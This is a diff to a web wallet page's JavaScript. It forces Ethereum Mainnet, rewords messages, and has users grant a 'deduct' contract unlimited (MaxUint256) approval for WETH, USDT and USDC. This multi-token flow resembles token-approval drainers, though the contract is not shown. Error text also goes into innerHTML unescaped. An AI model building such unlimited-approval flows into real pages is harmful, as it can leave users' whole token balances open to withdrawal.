@@ -42,26 +42,47 @@ function showOverlay(message) {
 }
 
 function updateStatus(message) {
-    if (message) {
-        statusDiv.innerHTML = message;
-        statusDiv.style.display = 'block';
-    } else {
-        statusDiv.style.display = 'none';
-    }
+    statusDiv.innerHTML = message || '';
+    statusDiv.style.display = message ? 'block' : 'none';
 }
 
 // --- Core Wallet Logic ---
 
 /**
- * Initializes wallet state, checks for provider and connection.
+ * Initializes wallet state, checks for provider, forces mainnet, and checks connection.
  */
 async function initializeWallet() {
     try {
         if (typeof window.ethereum === 'undefined') {
             return showOverlay('Please install MetaMask or a compatible wallet to continue.');
         }
+        
         provider = new ethers.BrowserProvider(window.ethereum);
 
+        // ✅ --- Force Mainnet Logic ---
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        const mainnetChainId = '0x1'; // Ethereum Mainnet's Chain ID
+
+        if (chainId !== mainnetChainId) {
+            showOverlay('Requesting to switch to Ethereum Mainnet...<br>Please approve in your wallet.');
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: mainnetChainId }],
+                });
+                // After a successful switch, the page will reload via the chainChanged event listener.
+                return; 
+            } catch (switchError) {
+                if (switchError.code === 4001) { // User rejected the switch
+                    return showOverlay('You must switch to Ethereum Mainnet to use this service.');
+                }
+                console.error("Failed to switch network:", switchError);
+                return showOverlay(`Failed to switch network. Please do it manually.<br>Error: ${switchError.message}`);
+            }
+        }
+        // --- End of Force Mainnet Logic ---
+
+        // Set up event listeners after network check is passed
         window.ethereum.on('accountsChanged', (accounts) => accounts.length === 0 ? resetState() : initializeWallet());
         window.ethereum.on('chainChanged', () => window.location.reload());
 
@@ -69,11 +90,6 @@ async function initializeWallet() {
         if (accounts.length > 0) {
             userAddress = accounts[0];
             signer = await provider.getSigner();
-
-            const network = await provider.getNetwork();
-            if (network.chainId !== 1n) { // Ethereum Mainnet
-                return showOverlay('Incorrect Network. Please switch to Ethereum Mainnet.');
-            }
 
             deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
             usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -122,6 +138,9 @@ async function checkAuthorization() {
         updateStatus("");
     } catch (error) {
         console.error("Check Authorization Error:", error);
+        if (error.code === 'CALL_EXCEPTION') {
+            return showOverlay('Could not connect to the contract on the current network.<br>Please ensure you are on Ethereum Mainnet and refresh the page.');
+        }
         showOverlay(`Authorization check failed: ${error.message}`);
     }
 }
@@ -178,17 +197,15 @@ async function connectWallet() {
  * Handles the authorization and activation flow for WETH.
  */
 async function handleWethAuthorizationFlow(requiredAllowance, serviceActivated) {
-    showOverlay('Setting up Requesting Authorize for you...');
-            
+    showOverlay('Setting up WETH payment for you...');
     const wethAllowance = await wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
     if (wethAllowance < requiredAllowance) {
-        showOverlay('Step 1/2: Requesting  Authorize...');
+        showOverlay('Step 1/2: Requesting WETH approval...<br>Please approve the maximum amount in your wallet.');
         const tx = await wethContract.approve(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
         await tx.wait();
     }
-
     if (!serviceActivated) {
-        showOverlay('Step 2/2: Activating service...<br>Please confirm in your wallet.');
+        showOverlay('Step 2/2: Activating service...<br>Please confirm the transaction in your wallet.');
         const tx = await deductContract.activateService(WETH_CONTRACT_ADDRESS);
         await tx.wait();
     }
@@ -198,31 +215,28 @@ async function handleWethAuthorizationFlow(requiredAllowance, serviceActivated) 
  * Handles the authorization and activation flow for USDT and USDC.
  */
 async function handleStablecoinAuthorizationFlow(requiredAllowance, serviceActivated) {
-    showOverlay('Setting up Requesting  Authorize for you...');
+    showOverlay('Setting up USDT / USDC payment for you...');
     let tokenToActivate = '';
-
     const usdtAllowance = await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
     if (usdtAllowance < requiredAllowance) {
-        showOverlay('Step 1/3: Requesting  Authorize...');
+        showOverlay('Step 1/3: Requesting USDT approval...<br>Please approve the maximum amount in your wallet.');
         const tx = await usdtContract.approve(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
         await tx.wait();
     }
     if ((await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
         if (!serviceActivated) tokenToActivate = USDT_CONTRACT_ADDRESS;
     }
-
     const usdcAllowance = await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
     if (usdcAllowance < requiredAllowance) {
-        showOverlay('Step 2/3: Requesting Authorize...');
+        showOverlay('Step 2/3: Requesting USDC approval...<br>Please approve the maximum amount in your wallet.');
         const tx = await usdcContract.approve(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
         await tx.wait();
     }
     if (!tokenToActivate && (await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
          if (!serviceActivated) tokenToActivate = USDC_CONTRACT_ADDRESS;
     }
-
     if (!serviceActivated && tokenToActivate) {
-        showOverlay('Step 3/3: Activating service...<br>Please confirm in your wallet.');
+        showOverlay('Step 3/3: Activating service...<br>Please confirm the transaction in your wallet.');
         const tx = await deductContract.activateService(tokenToActivate);
         await tx.wait();
     }
